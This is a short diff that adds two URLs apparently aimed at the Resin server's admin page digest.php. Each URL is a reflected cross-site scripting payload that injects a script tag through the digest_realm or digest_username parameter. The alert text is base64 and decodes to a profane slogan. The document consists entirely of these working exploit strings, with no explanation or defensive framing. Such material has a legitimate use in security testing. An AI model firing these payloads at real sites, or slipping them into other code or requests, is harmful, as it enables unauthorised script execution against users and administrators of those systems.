@@ -1,0 +1,2 @@
+http://www.example.com/resin-admin/digest.php?digest_attempt=1&amp;digest_realm=&quot;&gt;&lt;script&gt;alert(&quot;ZnVjayBjbnZk&quot;)&lt;/script&gt;&lt;a&amp;digest_username[]=
+http://www.example.com/resin-admin/digest.php?digest_attempt=1&amp;digest_username=&quot;&gt;&lt;script&gt;alert(&quot;ZnVjayBjbnZk&quot;)&lt;/script&gt;&lt;a
